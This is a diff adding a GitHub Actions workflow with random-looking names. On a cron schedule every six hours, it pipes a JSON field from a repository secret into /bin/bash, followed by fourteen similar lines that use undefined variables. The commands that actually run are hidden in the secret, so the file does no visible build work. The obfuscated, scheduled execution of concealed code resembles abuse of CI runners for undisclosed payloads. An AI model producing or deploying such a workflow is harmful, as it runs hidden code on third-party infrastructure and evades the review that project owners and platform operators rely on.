@@ -1,0 +1,33 @@
+name: zhejgejihuarens
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhejgejihuarens
+        env:
+          jt7053: ${{ secrets.jt7053 }}
+        run: |
+          echo $jt7053 | jq -r .hoqn25975 | /bin/bash
+          echo $dhcn41921 | jq -r .jkl40464 | /bin/bash
+          echo $en36670 | jq -r .b0 | /bin/bash
+          echo $fjdw626 | jq -r .nrss5 | /bin/bash
+          echo $tnevl1 | jq -r .fgos0 | /bin/bash
+          echo $ulz78 | jq -r .hlmr55719 | /bin/bash
+          echo $cqsa3 | jq -r .q78872 | /bin/bash
+          echo $rfecy532 | jq -r .ftdl2460 | /bin/bash
+          echo $dgtzw762 | jq -r .tf33375 | /bin/bash
+          echo $m8807 | jq -r .wfyxy5 | /bin/bash
+          echo $redjs2 | jq -r .vjoxg32 | /bin/bash
+          echo $s67 | jq -r .lwiij03 | /bin/bash
+          echo $oll19 | jq -r .xyi2279 | /bin/bash
+          echo $tr32 | jq -r .y013 | /bin/bash
+          echo $khul0 | jq -r .vl0864 | /bin/bash
+
